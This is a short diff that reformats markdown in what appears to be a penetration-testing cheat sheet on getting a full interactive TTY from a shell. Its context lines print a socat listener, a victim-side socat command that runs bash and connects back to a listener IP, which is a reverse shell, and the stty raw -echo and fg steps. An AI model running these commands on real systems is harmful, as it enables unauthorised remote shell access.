@@ -13,7 +13,7 @@ bash
 
 Socat  
 Listener:  
-`socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`  
+```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>```
 
 Victim:  
 `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:<PORT>`  
@@ -26,8 +26,10 @@ Ctrl-Z
 ```
 
 Attacker  
-`stty raw -echo`
-`fg`  
+```
+stty raw -echo  
+fg  
+```
 
 Victim  
 ```reset 
